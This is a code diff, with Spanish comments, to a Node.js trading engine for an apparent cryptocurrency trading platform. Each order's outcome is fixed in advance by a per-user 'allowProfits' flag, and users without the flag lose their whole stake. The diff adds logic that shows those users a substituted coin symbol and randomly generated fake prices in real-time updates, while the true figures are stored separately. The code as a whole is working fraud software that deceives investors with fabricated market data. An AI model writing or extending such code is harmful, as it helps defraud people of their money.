@@ -2,6 +2,44 @@ const User = require("../models/User");
 const Order = require("../models/Order");
 
 class TradingEngine {
+  // Mapa de criptomonedas alternativas y sus rangos de precios
+  static cryptoAlternatives = {
+    btc: {
+      symbol: "eth",
+      priceRange: { min: 2200, max: 2800 },
+    },
+    eth: {
+      symbol: "bnb",
+      priceRange: { min: 280, max: 320 },
+    },
+    bnb: {
+      symbol: "sol",
+      priceRange: { min: 90, max: 110 },
+    },
+    sol: {
+      symbol: "ada",
+      priceRange: { min: 0.4, max: 0.6 },
+    },
+    ada: {
+      symbol: "dot",
+      priceRange: { min: 5, max: 7 },
+    },
+  };
+
+  static getAlternativeCryptoData(originalSymbol) {
+    const symbolLower = originalSymbol.toLowerCase();
+    const altData = this.cryptoAlternatives[symbolLower];
+    if (!altData) return { symbol: originalSymbol, price: 100 }; // Default fallback
+
+    const price =
+      Math.random() * (altData.priceRange.max - altData.priceRange.min) +
+      altData.priceRange.min;
+    return {
+      symbol: altData.symbol,
+      price: price,
+    };
+  }
+
   static async processOrder(
     userId,
     cryptoSymbol,
@@ -25,48 +63,59 @@ class TradingEngine {
 
       const willProfit = user.allowProfits;
 
+      // Obtener datos de cripto alternativa si es necesario
+      const displayData = willProfit
+        ? { symbol: cryptoSymbol, price: initialPrice }
+        : this.getAlternativeCryptoData(cryptoSymbol);
+
       // Función para calcular la variación del precio según el tipo de cripto
-      const calculatePriceVariation = (symbol, initialPrice, isProfit) => {
-        // Para Bitcoin (variación entre 300-1000 USDT)
-        if (symbol.toLowerCase() === "btc") {
-          const variation = isProfit
-            ? Math.random() * 1200 + 300 // 300-1000 USDT para ganancia
-            : -(Math.random() * 1200 + 300); // -300 a -1000 USDT para pérdida
-          return variation;
-        }
-        // Para criptos de bajo valor (como DOGE, variación en centavos)
-        else if (initialPrice < 1) {
-          const variation = isProfit
-            ? Math.random() * 0.02 + 0.01 // 0.01-0.03 USDT para ganancia
-            : -(Math.random() * 0.02 + 0.01); // -0.01 a -0.03 USDT para pérdida
-          return variation;
-        }
-        // Para otras criptos (variación del 0.1% - 0.5%)
-        else {
-          const percentVariation = (Math.random() * 0.7 + 0.1) / 100; // 0.1% - 0.5%
-          return (
-            initialPrice * (isProfit ? percentVariation : -percentVariation)
-          );
+      const calculatePriceVariation = (symbol, basePrice, isProfit) => {
+        const symbolLower = symbol.toLowerCase();
+        if (symbolLower === "btc") {
+          return isProfit
+            ? Math.random() * 1200 + 300
+            : -(Math.random() * 1200 + 300);
+        } else if (symbolLower === "eth") {
+          return isProfit
+            ? Math.random() * 100 + 20
+            : -(Math.random() * 100 + 20);
+        } else if (basePrice < 1) {
+          return isProfit
+            ? Math.random() * 0.02 + 0.01
+            : -(Math.random() * 0.02 + 0.01);
+        } else {
+          const percentVariation = (Math.random() * 0.7 + 0.1) / 100;
+          return basePrice * (isProfit ? percentVariation : -percentVariation);
         }
       };
 
-      // Calcular el precio final con variación realista
-      const priceVariation = calculatePriceVariation(
+      // Calcular variaciones de precio
+      const realPriceVariation = calculatePriceVariation(
         cryptoSymbol,
         initialPrice,
         willProfit
       );
-      const targetPrice = initialPrice + priceVariation;
+      const displayPriceVariation = calculatePriceVariation(
+        displayData.symbol,
+        displayData.price,
+        willProfit
+      );
 
-      // Crear la orden
+      const realTargetPrice = initialPrice + realPriceVariation;
+      const displayTargetPrice = displayData.price + displayPriceVariation;
+
+      // Crear la orden con datos reales y de visualización
       const order = new Order({
         user: userId,
         cryptoSymbol,
+        displaySymbol: displayData.symbol,
         orderType,
         amount,
         duration,
         initialPrice,
-        targetPrice,
+        displayInitialPrice: displayData.price,
+        targetPrice: realTargetPrice,
+        displayTargetPrice,
         profitPercentage,
         status: "en progreso",
         willProfit: user.allowProfits,
@@ -90,45 +139,46 @@ class TradingEngine {
         if (currentTime >= endTime) {
           clearInterval(interval);
 
-          // Calcular resultado basado en el porcentaje seleccionado, no en el movimiento del precio
           let result;
           if (willProfit) {
             result = (amount * profitPercentage) / 100;
           } else {
-            result = -amount; // Pérdida total en caso de willProfit false
+            result = -amount;
           }
 
-          // Actualizar la orden
           order.status = "completada";
-          order.finalPrice = targetPrice;
+          order.finalPrice = realTargetPrice;
+          order.displayFinalPrice = displayTargetPrice;
           order.result = result;
           order.completedAt = new Date();
           await order.save();
 
-          // Actualizar balance del usuario
           if (willProfit) {
             user.balanceUSDT += amount + result;
+            await user.save();
           }
-          await user.save();
 
           if (io) {
             io.to(userId.toString()).emit("orderComplete", {
               orderId: order._id,
-              finalPrice: targetPrice,
+              displaySymbol: displayData.symbol,
+              finalPrice: displayTargetPrice,
               result,
             });
           }
         } else {
-          // Generar precio actual con pequeñas variaciones
-          const progressPrice = initialPrice + priceVariation * progress;
-          // Añadir pequeño ruido al precio
-          const noise = initialPrice * (Math.random() - 0.5) * 0.0001; // ±0.01%
-          const currentPrice = progressPrice + noise;
+          const realProgressPrice =
+            initialPrice + realPriceVariation * progress;
+          const displayProgressPrice =
+            displayData.price + displayPriceVariation * progress;
+          const noise = displayData.price * (Math.random() - 0.5) * 0.0001;
+          const currentDisplayPrice = displayProgressPrice + noise;
 
           if (io) {
             io.to(userId.toString()).emit("orderUpdate", {
               orderId: order._id,
-              currentPrice,
+              displaySymbol: displayData.symbol,
+              currentPrice: currentDisplayPrice,
               progress,
             });
           }
